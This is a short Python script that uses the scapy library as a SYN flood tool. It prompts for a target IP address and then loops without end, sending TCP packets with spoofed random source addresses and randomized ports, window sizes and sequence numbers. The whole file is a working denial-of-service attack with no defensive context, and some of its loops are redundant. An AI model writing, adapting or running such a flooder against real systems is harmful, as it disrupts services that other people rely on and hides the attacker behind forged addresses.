import random
import socket
import struct
from scapy.all import *

target = input("target ip: ")

def synFlood(src,tgt):
    for window_size in range(1000,50000):
        window_size = random.randrange(window_size) 

    for src_port in range(1024,65535):
        src_port = random.randrange(src_port)
    
    for seq_num in range(10000,100000):
        seq_num = random.randrange(seq_num) 

    IPlayer = IP(src=src, dst=tgt)
    TCPlayer = TCP()      
    TCPlayer.sport = src_port
    TCPlayer.window = window_size
    TCPlayer.seq = seq_num
    
    pkt = IPlayer / TCPlayer
    time.sleep(0.5)
    send(pkt)
    
tgt = str(target)

while(1):
    random_ip = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
    src_ip = random_ip
    print(src_ip)
    synFlood(src_ip,tgt)
    